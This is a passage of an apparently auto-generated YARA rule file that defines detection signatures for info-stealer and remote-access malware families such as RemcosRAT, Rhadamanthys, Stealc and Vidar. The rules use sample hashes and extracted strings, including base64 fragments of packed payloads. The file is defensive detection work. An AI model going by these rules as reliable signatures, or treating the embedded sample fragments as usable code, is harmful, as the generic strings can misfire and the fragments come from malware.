      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash7 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash8 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "8GetSystemSupportsLeapSeconds>GetGetSystemTimeAsFileTimeFnPtr" fullword ascii /* score: '15.00'*/
      $s2 = "SetHashCode.InitializeCurrentThread" fullword ascii /* score: '13.00'*/
      $s3 = "FreeLibrary4GetFileAttributesExPrivate" fullword ascii /* score: '12.00'*/
      $s4 = "TryGetExport" fullword ascii /* score: '12.00'*/
      $s5 = "GetSystemTimeAsFileTim" fullword wide /* score: '12.00'*/
      $s6 = "GetSystemTimePreciseAsFileTim" fullword wide /* score: '12.00'*/
      $s7 = "6System.IConvertible.ToInt32@" fullword ascii /* score: '10.00'*/
      $s8 = "6System.IConvertible.ToInt64@" fullword ascii /* score: '10.00'*/
      $s9 = "6System.IConvertible.ToInt16@" fullword ascii /* score: '10.00'*/
      $s10 = "Could not find a comma, or the length between the previous token and the comma was zero (i.e., '0x,'etc.)" fullword wide /* score: '10.00'*/
      $s11 = ".DataMisalignedException" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__123 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash4 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash5 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash6 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash7 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash8 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash9 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s2 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.materializeGCProg" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.dodeltimer0" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.modtimer" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.hasPrefix" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.resettimer" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.updateTimer0When" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.nobarrierWakeTime" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.addAdjustedTimers" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.clearDeletedTimers" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.checkTimers" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.siftupTimer" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.runtimer" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.moveTimers" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_124 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash7 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash8 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash9 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash10 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
      hash11 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s2 = "&InitCultureDataCore InitUserOverride$GetTimeFormatsCore@" fullword ascii /* score: '17.00'*/
      $s3 = "HTryGetDynamicGenericMethodComponents@" fullword ascii /* score: '12.00'*/
      $s4 = "FTryGetStaticGenericMethodComponents" fullword ascii /* score: '12.00'*/
      $s5 = "System.Numerics.INumberBase<System.UInt32>.TryConvertFromSaturating" fullword ascii /* score: '10.00'*/
      $s6 = "System.Numerics.INumberBase<System.UInt32>.TryConvertToSaturating" fullword ascii /* score: '10.00'*/
      $s7 = " get_NumberFormat@" fullword ascii /* score: '9.00'*/
      $s8 = "GetName@" fullword ascii /* score: '9.00'*/
      $s9 = "get_Key@" fullword ascii /* score: '9.00'*/
      $s10 = "get_AMDesignator get_PMDesignator" fullword ascii /* score: '9.00'*/
      $s11 = "WriteLineD<get_Out>g__EnsureInitialized|26_0b<get_IsOutputRedirected>g__EnsureInitialized|36_0" fullword ascii /* score: '9.00'*/
      $s12 = "GetType@" fullword ascii /* score: '9.00'*/
      $s13 = "get_NaNSymbol4get_PositiveInfinitySymbol4get_NegativeInfinitySymbol\"get_PercentSymbol$get_PerMilleSymbol,get_CurrencyGroupSizes" ascii /* score: '9.00'*/
      $s14 = "get_NaNSymbol4get_PositiveInfinitySymbol4get_NegativeInfinitySymbol\"get_PercentSymbol$get_PerMilleSymbol,get_CurrencyGroupSizes" ascii /* score: '9.00'*/
      $s15 = ",get_IsOutputRedirected" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__125 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash3 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash4 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash5 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash6 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash7 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash8 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash9 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $s1 = "wrong medium type  but memory size  to non-Go memory , locked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGet" ascii /* score: '29.00'*/
      $s2 = "dex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canceledruntime.semacreaterunt" ascii /* score: '26.00'*/
      $s3 = "wrong medium type  but memory size  to non-Go memory , locked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGet" ascii /* score: '23.00'*/
      $s4 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: GetQueuedCo" ascii /* score: '22.00'*/
      $s5 = "tUserNameExWMB; allocated NetUserGetInfoProcess32NextWSetFilePointerTranslateNameWallocfreetracebad allocCountbad span statebad " ascii /* score: '19.00'*/
      $s6 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: GetQueuedCo" ascii /* score: '19.00'*/
      $s7 = "FileAttributesWLookupAccountNameWRFS specific errorSetFileAttributesWSystemFunction036" fullword ascii /* score: '16.00'*/
      $s8 = "ableno message of desired typenotewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0required key not ava" ascii /* score: '15.00'*/
      $s9 = "e busytoo many linkstoo many userswinapi error #work.full != 0  with GC prog" fullword ascii /* score: '15.00'*/
      $s10 = "casfrom_Gscanstatus:top gp->status is not in scan stategentraceback callback cannot be used with non-zero skipnewproc: function " ascii /* score: '14.00'*/
      $s11 = "CertGetCertificateChainFreeEnvironmentStringsWGetEnvironmentVariableWGetSystemTimeAsFileTimeMB during sweep; swept SetEnvironmen" ascii /* score: '13.00'*/
      $s12 = " *( -  <  >  m=%: ???NaNPC=]:" fullword ascii /* score: '12.00'*/
      $s13 = "as _GCmarkterminationgentraceback cannot trace user goroutine on its own stackruntime:stoplockedm: g is not Grunnable or Gscanru" ascii /* score: '11.00'*/
      $s14 = "anfreedefer with d.fn != nilinitSpan: unaligned lengthinvalid request descriptorname not unique on networkno CSI structure avail" ascii /* score: '10.00'*/
      $s15 = "runtime.typestring" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__8f1b4058_RemcosRAT_signature__dacfee8b_126 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_8f1b4058.js, RemcosRAT(signature)_dacfee8b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f1b4058ea33988e80e1ca765d6054045b5da575b7678b7e79afb9957128760b"
      hash2 = "dacfee8b1805f6536369bf401c7104946429f2e68c4e7143b60d9153b23c7c76"
   strings:
      $s1 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s2 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s3 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s4 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s5 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s6 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s7 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s8 = "    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' " fullword ascii /* score: '15.00'*/
      $s9 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s10 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s11 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
      $s12 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
      $s13 = "    ///     xmlns:psf=\"http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\"" fullword ascii /* score: '15.00'*/
      $s14 = "    // Get PDC configuration file from script context" fullword ascii /* score: '13.00'*/
      $s15 = "            + \"xmlns:xsd='http://www.w3.org/2001/XMLSchema' \"" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__127 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash15 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash16 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware> <!-- legacy -->" fullword ascii /* score: '25.00'*/
      $s2 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">permonitorv2,permonitor</dpiAwareness>" fullword ascii /* score: '12.00'*/
      $s3 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2017/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s4 = "      <!-- The ID below indicates application support for Windows 10 -->" fullword ascii /* score: '11.00'*/
      $s5 = "      <!-- The ID below indicates application support for Windows 8.1 -->" fullword ascii /* score: '11.00'*/
      $s6 = "runtime.newdefer.func1" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.float64frombits" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.funcPC" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.freedefer.func1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.totaldefersize" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.newdefer.func2" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.deferArgs" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.testdefersizes" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.jmpdefer" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.tracebackdefers" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_RemcosRAT_signature__aa569300_128 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash2 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
      hash3 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAF" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAEAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s4 = "AAAAAAAAAAAAAAAAF" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAEAAAE" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "FAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "AAAAACAAACA" ascii /* base64 encoded string */ /* score: '12.50'*/
      $s10 = "U4pKAVZXicONdBEKi3wRBosWi0YEAdiLErkBAAAA6AsAAACDxghPf+dfXlvDkIXJD4SKAAAAU1ZXicOJ1onPMdKKBopWATHJPAp0IjwLdB48DHQkPA10MzwOdE08D3QO" ascii /* score: '11.00'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBFAABMAQkAGV5CKgAAAAAAAAAA4ACOgQsB" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7f46e341_RemcosRAT_signature__aa569300_129 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash2 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s2 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s3 = "BAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s4 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '14.50'*/
      $s5 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '14.50'*/
      $s6 = "bAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s7 = "b25FeEEAAAB" ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "wn1Ki0UIi0DIi0BMixD/UiCLVQiLUvyLTQgrUfQr0NH6eQOD0gCLRQgDUPRCi0UIiVD0i0UIi0DIi0BMixD/UiCLVQgDQvSLVQiJQvyLRQiLQMiLSEyLRQiNUPCLRQiL" ascii /* score: '11.00'*/
      $s9 = "lDucO6Q7rDu0O7w7xDvMO9Q73DvkO+w79Dv8OwQ8DDwUPBw8JDwsPDQ8PDxEPEw8VDxcPGQ8bDx0PHw8hDyMPJQ8nDykPKw8tDy8PMQ8zDzUPNw85DzsPPQ8/DwEPQw9" ascii /* score: '11.00'*/
      $s10 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* score: '8.50'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imph_130 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s2 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s3 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s4 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s5 = "SystemFuH" fullword ascii /* base64 encoded string*/ /* score: '17.00'*/
      $s6 = "ntdll.dlH" fullword ascii /* score: '15.00'*/
      $s7 = "winmm.dlH" fullword ascii /* score: '10.00'*/
      $s8 = "WSAGetOvH" fullword ascii /* score: '9.00'*/
      $s9 = "GetSysteH" fullword ascii /* score: '9.00'*/
      $s10 = "wine_getH" fullword ascii /* score: '9.00'*/
      $s11 = "kernel32H" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__Stealc_signature__c7269d59926fa4252270f407e4dab043_imphas_131 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash3 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $s1 = "CertEnumCertificatesInStoreG waiting list is corruptedaddress not a stack addresschannel number out of rangecommunication error " ascii /* score: '25.00'*/
      $s2 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '24.00'*/
      $s3 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '24.00'*/
      $s4 = "sweep: bad span statenot a XENIX named type fileprogToPointerMask: overflowrunlock of unlocked rwmutexruntime: asyncPreemptStack" ascii /* score: '23.00'*/
      $s5 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '19.00'*/
